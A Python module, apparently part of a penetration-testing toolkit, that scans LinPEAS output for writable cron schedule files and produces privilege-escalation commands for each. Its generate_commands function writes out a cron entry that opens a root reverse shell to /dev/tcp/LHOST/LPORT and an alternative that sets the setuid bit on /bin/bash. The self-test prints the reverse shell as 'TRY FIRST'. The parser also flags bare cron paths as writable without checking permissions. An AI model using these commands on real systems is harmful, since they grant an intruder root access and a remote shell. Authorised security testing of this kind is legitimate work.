"""Detect writable /etc/cron.d/ and cron schedule directories from LinPEAS output.

Files in /etc/cron.d/ are loaded directly by crond and executed as root.
Distinct from writable_cron (which detects scripts CALLED by cron jobs).
"""

import re
from typing import Dict, List

# Match permission+path on an ls -l line for cron dirs
_PERM_CRON_RE = re.compile(
    r"^([-dl][rwxsStT-]{9})\s+\d+\s+\S+\s+\S+\s+\S+.*?(/etc/cron[./][^\s]+)",
)

# Bare path lines
_BARE_CRON_RE = re.compile(r"^(/etc/cron(?:\.d|\.daily|\.weekly|\.monthly|\.hourly)/[^\s]+)$")

# Any mention with a cron.d path (for "Writable: /etc/cron.d/..." lines)
_ANY_CRON_D_RE = re.compile(r"(/etc/cron(?:\.d|\.daily|\.weekly|\.monthly|\.hourly)/[^\s,;'\"]+)")

_CRON_DIR_PREFIXES = (
    "/etc/cron.d/", "/etc/cron.daily/", "/etc/cron.weekly/",
    "/etc/cron.monthly/", "/etc/cron.hourly/",
)


def _is_writable_perm(perm: str) -> bool:
    """Return True if permission string shows group or other write access."""
    # perm is 9 chars (after the file-type char was captured without it)
    # positions: owner(0-2) group(3-5) other(6-8)
    return perm[4] == "w" or perm[7] == "w"


def parse_cron_d_section(section_text: str) -> List[str]:
    """Extract writable cron.d file paths from LinPEAS writable-file sections."""
    paths: List[str] = []
    seen: set = set()

    for line in section_text.splitlines():
        stripped = line.strip()
        if not stripped:
            continue

        # ls -l line with permissions
        m = _PERM_CRON_RE.match(stripped)
        if m:
            # perm[0] is file type, perm[1:10] is rwx bits
            perm_full = m.group(1)  # 10 chars including file type
            perm_bits = perm_full[1:]  # 9 rwx chars
            path = m.group(2)
            if _is_writable_perm(perm_bits) and path not in seen:
                seen.add(path)
                paths.append(path)
            continue

        # Bare path lines (LinPEAS sometimes lists just the path)
        m2 = _BARE_CRON_RE.match(stripped)
        if m2:
            path = m2.group(1)
            if path not in seen:
                seen.add(path)
                paths.append(path)
            continue

        # "Writable: /etc/cron.d/..." style lines
        if "writable" in stripped.lower() or stripped.startswith("/etc/cron"):
            for m3 in _ANY_CRON_D_RE.finditer(stripped):
                path = m3.group(1).rstrip(".,;:'\"")
                if path not in seen:
                    seen.add(path)
                    paths.append(path)

    return paths


def generate_commands(cron_path: str) -> List[str]:
    """Generate root shell commands via a writable cron.d file."""
    return [
        f"echo '* * * * * root bash -i >& /dev/tcp/LHOST/LPORT 0>&1' >> {cron_path}",
        "# Wait up to 60 seconds for cron to execute",
        f"# Or: echo '* * * * * root chmod +s /bin/bash' >> {cron_path}",
        "# Wait 60s, then: /bin/bash -p",
    ]


def analyze(section_text: str) -> List[Dict]:
    """Analyze LinPEAS output for writable /etc/cron.d/ files.

    Returns a CRITICAL finding for each writable cron schedule file detected.
    """
    findings: List[Dict] = []
    for cron_path in parse_cron_d_section(section_text):
        findings.append({
            "cron_path": cron_path,
            "severity": "CRITICAL",
            "type": "writable_cron_d",
            "description": "world/group-writable cron schedule file — executed as root",
            "commands": generate_commands(cron_path),
        })
    return findings


# ── CLI self-test ──────────────────────────────────────────────────────────────

if __name__ == "__main__":
    SAMPLE = """
-rw-rw-rw- 1 root root 120 Jan 2024 /etc/cron.d/backup
Writable: /etc/cron.d/backup
/etc/cron.daily/logrotate
"""
    print("=== parse_cron_d_section ===")
    for p in parse_cron_d_section(SAMPLE):
        print(" ", p)

    print("\n=== analyze ===")
    for f in analyze(SAMPLE):
        print(f"[{f['severity']}] {f['type']} -> {f['cron_path']}")
        print(f"  TRY FIRST: $ {f['commands'][0]}")
